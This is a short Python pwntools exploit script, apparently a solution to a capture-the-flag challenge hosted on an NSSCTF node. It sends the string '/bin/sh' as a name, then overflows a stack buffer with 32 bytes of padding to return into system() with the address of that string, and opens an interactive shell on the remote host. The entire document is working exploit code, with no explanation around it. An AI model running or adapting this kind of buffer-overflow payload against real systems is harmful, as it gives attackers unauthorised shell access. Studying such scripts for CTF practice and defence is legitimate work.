from pwn import *

p=remote('node5.anna.nssctf.cn',20264)

p.sendlineafter("please tell me your name",b'/bin/sh')
sh_addr=0x804A080
sys_addr=0x80483D0
payload=b'a'*(28+4)+p32(sys_addr)+p32(0)+p32(sh_addr)
p.sendlineafter("time~",payload)
p.interactive()
